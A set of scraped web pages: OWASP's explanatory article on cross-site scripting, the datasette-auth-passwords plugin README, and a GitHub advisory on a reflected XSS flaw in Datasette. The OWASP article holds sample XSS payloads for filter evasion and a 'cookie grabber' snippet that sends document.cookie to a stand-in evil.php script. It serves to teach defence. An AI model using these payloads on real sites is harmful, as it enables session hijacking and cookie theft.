=== Content from owasp.org_c5cbda17_20250114_233547.html ===


For full functionality of this site it is necessary to enable JavaScript. Here are the  [instructions how to enable JavaScript in your web browser](http://turnonjs.com/).

[![OWASP logo](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

[![](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

 [Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

This website uses cookies to analyze our traffic and only share that information with our analytics partners.

Accept

x

[Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

# Cross Site Scripting (XSS)

**Author:** KirstenS

**Contributor(s):** Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Related Security Activities

### How to Avoid Cross-site scripting Vulnerabilities

* [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
* OWASP Development Guide [article on Data Validation](https://wiki.owasp.org/index.php/Data_Validation)
* OWASP Development Guide [article on Phishing](https://wiki.owasp.org/index.php/Phishing)

### How to Review Code for Cross-site scripting Vulnerabilities

See the [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/).

### How to Test for Cross-site scripting Vulnerabilities

See the latest [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to
test for the various kinds of XSS vulnerabilities.

* [Testing\_for\_Reflected\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
* [Testing\_for\_Stored\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
* [Testing\_for\_DOM-based\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html)

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("name");
%>

Employee Name: <%= name %>

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

## Related [Attacks](https://owasp.org/www-community/attacks/)

* [XSS Attacks](https://owasp.org/www-community/attacks/xss/)
* [Invoking untrusted mobile code](https://owasp.org/www-community/attacks/Mobile_code_invoking_untrusted_mobile_code)
* [Cross Site History Manipulation (XSHM)](https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_%28XSHM%29)

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

* [Improper Data Validation](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)
* [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
* OWASP Development Guide [article on Data Validation](https://wiki.owasp.org/index.php/Data_Validation)
* OWASP Development Guide [article on Phishing](https://wiki.owasp.org/index.php/Phishing)

## Related Controls

* [Data Validation](https://wiki.owasp.org/index.php/Data_Validation)

## References

* OWASP’s [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [Testing\_for\_Reflected\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
* [Testing\_for\_Stored\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html)
* [Testing\_for\_DOM-based\_Cross\_site\_scripting](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.html)
* [The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
* OWASP [XSS Filter Evasion Cheat Sheet](/xss-filter-evasion-cheatsheet)
* [CERT Advisory on Malicious HTML Tags](http://www.cert.org/advisories/CA-2000-02.html)
* [CERT “Understanding Malicious Content Mitigation](http://www.cert.org/tech_tips/malicious_code_mitigation.html)
* [Understanding the cause and effect of CSS Vulnerabilities](http://www.technicalinfo.net/papers/CSS.html)
* [XSSed](http://www.xssed.com) - Cross-Site Scripting (XSS) Information and Mirror Archive of Vulnerable Websites

[Category:Injection](https://owasp.org/www-community/Injection_Flaws)
[Category:OWASP Top Ten Project](https://owasp.org/www-project-top-ten/)
[Category:Attack](https://owasp.org/www-community/attacks/)

---

[Watch](https://github.com/owasp/www-community/subscription)
[Star](https://github.com/owasp/www-community)

**The OWASP® Foundation** works to improve the security of software through its community-led open source software projects,
hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
### Important Community Links

* [Community](/www-community/)
* Attacks (You are here)
* [Vulnerabilities](/www-community/vulnerabilities)
* [Controls](/www-community/controls)

### Upcoming OWASP Global Events

## Corporate Supporters

[Become a corporate supporter](https://owasp.org/supporters)

* [HOME](https://owasp.org/)
* [PROJECTS](https://owasp.org/projects/)
* [CHAPTERS](https://owasp.org/chapters/)
* [EVENTS](https://owasp.org/events/)
* [ABOUT](https://owasp.org/about/)
* [PRIVACY](https://owasp.org/www-policy/operational/privacy)
* [SITEMAP](https://owasp.org/sitemap/)
* [CONTACT](https://owasp.org/contact/)

OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc.



=== Content from datasette.io_58d2fbba_20250114_233540.html ===

[![Datasette](/static/datasette-logo.svg)](/)

* [Uses](/for)
* [Documentation Docs](https://docs.datasette.io/en/stable/)
* [Tutorials](/tutorials)
* [Examples](/examples)
* [Plugins](/plugins)
* [Tools](/tools)
* [News](/news)

[Plugins](/plugins) > datasette-auth-passwords

# datasette-auth-passwords by simonw

474 downloads this week
[Star](https://github.com/simonw/datasette-auth-passwords)

## README [source code](https://github.com/simonw/datasette-auth-passwords)

# datasette-auth-passwords

[![PyPI](https://camo.githubusercontent.com/f76dc83d569eb67312dcc1fd9e8557149ea1fb7f3800d8cb306b29ad3c5c8dc7/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6461746173657474652d617574682d70617373776f7264732e737667)](https://pypi.org/project/datasette-auth-passwords/)
[![Changelog](https://camo.githubusercontent.com/f30a5b377cd3ea5de3942ad5588ba4a7b85cdd0901347e8d3238e376a3bb0ab5/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f73696d6f6e772f6461746173657474652d617574682d70617373776f7264733f6c6162656c3d6368616e67656c6f67)](https://github.com/simonw/datasette-auth-passwords/releases)
[![License](https://camo.githubusercontent.com/c355f200ea90fddaa407b6eaab303663a669248ea3ca7b1fcf77dbe04ff5f48c/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d417061636865253230322e302d626c75652e737667)](https://github.com/simonw/datasette-auth-passwords/blob/master/LICENSE)

Datasette plugin for authenticating access using passwords

## Installation

Install this plugin in the same environment as Datasette.

```
datasette install datasette-auth-passwords
```

## Demo

A demo of this plugin is running at <https://datasette-auth-passwords-demo.datasette.io/>

The demo is configured to show the `public.db` database to everyone, but the `private.db` database only to logged in users.

You can log in at <https://datasette-auth-passwords-demo.datasette.io/-/login> with username `root` and password `password!`.

## Usage

This plugin works based on a list of username/password accounts that are hard-coded into the plugin configuration.

First, you'll need to create a password hash. There are three ways to do that:

* Install the plugin, then use the interactive tool located at `/-/password-tool`
* Use the hosted version of that tool at <https://datasette-auth-passwords-demo.datasette.io/-/password-tool>
* Use the `datasette hash-password` command, described below

Now add the following to your `metadata.json`:

```
{
    "plugins": {
        "datasette-auth-passwords": {
            "someusername_password_hash": {
                "$env": "PASSWORD_HASH_1"
            }
        }
    }
}
```

The password hash can now be specified in an environment variable when you run Datasette. You can do that like so:

```
PASSWORD_HASH_1='pbkdf2_sha256$...' \
    datasette -m metadata.json

```

Be sure to use single quotes here otherwise the `$` symbols in the password hash may be incorrectly interpreted by your shell.

You will now be able to log in to your instance using the form at `/-/login` with `someusername` as the username and the password that you used to create your hash as the password.

You can include as many accounts as you like in the configuration, each with different usernames.

### datasette hash-password

The plugin exposes a new CLI command, `datasette hash-password`. You can run this without arguments to interactively create a new password hash:

```
datasette hash-password
```
```
Password:
Repeat for confirmation:
pbkdf2_sha256$260000$1513...

```

Or if you want to use it as part of a script, you can add the `--no-confirm` option to generate a hash directly from a value passed to standard input:

```
echo 'my password' | datasette hash-password --no-confirm
```
```
pbkdf2_sha256$260000$daa...

```
### Specifying actors

By default, a logged in user will result in an [actor block](https://datasette.readthedocs.io/en/stable/authentication.html#actors) that just contains their username:

```
{
    "id": "someusername"
}
```

You can customize the actor that will be used for a username by including an `"actors"` configuration block, like this:

```
{
    "plugins": {
        "datasette-auth-passwords": {
            "someusername_password_hash": {
                "$env": "PASSWORD_HASH_1"
            },
            "actors": {
                "someusername": {
                    "id": "someusername",
                    "name": "Some user"
                }
            }
        }
    }
}
```

### HTTP Basic authentication option

This plugin defaults to implementing login using an HTML form that sets a signed authentication cookie.

You can alternatively configure it to use [HTTP Basic authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#basic_authentication_scheme) instead.

Do this by adding `"http_basic_auth": true` to the `datasette-auth-passwords` block in your plugin configuration.

This option introduces the following behaviour:

* Account usernames and passwords are configured in the same way as form-based authentication
* Every page within Datasette - even pages that normally do not use authentication, such as static assets - will display a browser login prompt
* Users will be unable to log out without closing their browser entirely

There is a demo of this mode at <https://datasette-auth-passwords-http-basic-demo.datasette.io/> - sign in with username `root` and password `password!`

### Using with datasette publish

If you are publishing data using a [datasette publish](https://datasette.readthedocs.io/en/stable/publish.html#datasette-publish) command you can use the `--plugin-secret` option to securely configure your password hashes (see [secret configuration values](https://datasette.readthedocs.io/en/stable/plugins.html#secret-configuration-values)).

You would run the command something like this:

```
datasette publish cloudrun mydatabase.db \
    --install datasette-auth-passwords \
    --plugin-secret datasette-auth-passwords root_password_hash 'pbkdf2_sha256$...' \
    --service datasette-auth-passwords-demo

```

This will allow you to log in as username `root` using the password that you used to create the hash.

## Development

To set up this plugin locally, first checkout the code. Then create a new virtual environment:

```
cd datasette-auth-passwords
python3 -mvenv venv
source venv/bin/activate

```

Or if you are using `pipenv`:

```
pipenv shell

```

Now install the dependencies and tests:

```
pip install -e '.[test]'

```

To run the tests:

```
pytest

```

Powered by [Datasette](https://datasette.io/ "Datasette v1.0a2")
· [How this site works](https://github.com/simonw/datasette.io)
· [Code of conduct](https://github.com/simonw/datasette/blob/main/CODE_OF_CONDUCT.md)



=== Content from github.com_14e97312_20250114_233545.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsimonw%2Fdatasette%2Fsecurity%2Fadvisories%2FGHSA-xw7c-jx9m-xh5g)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsimonw%2Fdatasette%2Fsecurity%2Fadvisories%2FGHSA-xw7c-jx9m-xh5g)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=simonw%2Fdatasette)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[simonw](/simonw)
/
**[datasette](/simonw/datasette)**
Public

* [Notifications](/login?return_to=%2Fsimonw%2Fdatasette) You must be signed in to change notification settings
* [Fork
  702](/login?return_to=%2Fsimonw%2Fdatasette)
* [Star
   9.7k](/login?return_to=%2Fsimonw%2Fdatasette)

* [Code](/simonw/datasette)
* [Issues
  563](/simonw/datasette/issues)
* [Pull requests
  54](/simonw/datasette/pulls)
* [Discussions](/simonw/datasette/discussions)
* [Actions](/simonw/datasette/actions)
* [Wiki](/simonw/datasette/wiki)
* [Security](/simonw/datasette/security)
* [Insights](/simonw/datasette/pulse)

Additional navigation options

* [Code](/simonw/datasette)
* [Issues](/simonw/datasette/issues)
* [Pull requests](/simonw/datasette/pulls)
* [Discussions](/simonw/datasette/discussions)
* [Actions](/simonw/datasette/actions)
* [Wiki](/simonw/datasette/wiki)
* [Security](/simonw/datasette/security)
* [Insights](/simonw/datasette/pulse)

# Reflected cross-site scripting issue in Datasette

High

[simonw](/simonw)
published
GHSA-xw7c-jx9m-xh5g
Jun 5, 2021

## Package

pip

datasette
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<0.56.1

## Patched versions

0.56.1,0.57

## Description

### Impact

The `?_trace=1` debugging feature in Datasette does not correctly escape generated HTML, resulting in a [reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks) vulnerability.

This vulnerability is particularly relevant if your Datasette installation includes authenticated features using plugins such as [datasette-auth-passwords](https://datasette.io/plugins/datasette-auth-passwords) as an attacker could use the vulnerability to access protected data.

### Patches

Datasette 0.57 and 0.56.1 both include patches for this issue.

### Workarounds

If you run Datasette behind a proxy you can workaround this issue by rejecting any incoming requests with `?_trace=` or `&_trace=` in their query string parameters.

### References

* [OWASP guide to reflected cross-site scripting](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks)
* [Datasette issue #1360](https://github.com/simonw/datasette/issues/1360)

### For more information

If you have any questions or comments about this advisory:

* Open a discussion in [simonw/datasette](https://github.com/simonw/datasette/discussions)
* Email us at `swillison+datasette @ gmail.com`

### Severity

High

### CVE ID

CVE-2021-32670

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_80b14d62_20250114_233543.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsimonw%2Fdatasette%2Fissues%2F1360)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
